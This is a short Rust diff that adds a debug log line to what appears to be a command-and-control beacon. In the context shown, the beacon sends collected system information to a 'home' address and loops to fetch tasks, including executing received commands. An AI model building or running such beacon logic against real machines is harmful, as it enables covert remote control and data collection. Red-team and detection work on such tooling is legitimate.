@@ -14,6 +14,7 @@ pub fn run(home: SocketAddrV4) -> windows::core::Result<()> {
     // sending collected system's info
     beacon.send_system_info()?;
 
+    log::debug!("entering main program loop...");
     loop {
         match beacon.get_task()? {
             Task::Exec(cmd_bytes) => {
